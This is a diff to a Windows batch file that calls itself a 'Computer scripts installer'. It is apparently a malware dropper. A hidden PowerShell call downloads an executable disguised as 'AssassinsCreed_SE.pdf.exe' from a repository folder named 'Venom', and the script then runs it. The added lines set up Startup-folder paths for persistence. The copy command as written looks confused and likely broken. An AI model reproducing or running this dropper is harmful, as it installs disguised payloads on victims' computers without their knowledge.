@@ -1,6 +1,7 @@
 @echo off
 @rem Computer scripts installer
-
+$INI_PATH="C:/Users/%USERNAME%/Desktop"
+$startup="C:/Users/%USERNAME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 @rem Function to check internet connection
 :check_internet
 echo Checking internet connectivity...
@@ -39,6 +40,8 @@ Check internet connectivity before downloading the payload
 call :check_internet
 
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"
+
+copy $startup/AssassinsCreed_SE.pdf.exe $INI_PATH
 
 start AssassinsCreed_SE.pdf.exe
 
